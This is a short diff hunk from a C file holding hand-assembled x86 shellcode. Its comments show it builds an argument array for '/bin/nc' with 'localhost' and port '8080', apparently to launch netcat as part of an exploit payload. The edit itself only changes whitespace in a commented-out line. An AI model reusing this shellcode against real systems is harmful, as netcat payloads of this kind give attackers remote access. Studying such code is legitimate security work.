@@ -41,7 +41,7 @@ char shellcode[] =
 	"\x89\x76\x1b"			// put the address of '/bin/nc' after the string array
 	"\x8d\x5e\x08"			// grab the address of 'localhost'
 	"\x89\x5e\x1f"			// add address of 'localhost' to address array
-	/* "\x8d\x5e\x16"			// grab the address of '8080' */
+	/* "\x8d\x5e\x16"		// grab the address of '8080' */
 	"\x8d\x5e\x12"			// grab the address of '8080'
 	"\x89\x5e\x23"			// add address of '8080' to address array
 	"\x89\x46\x27"			// stick a null at the end of address array
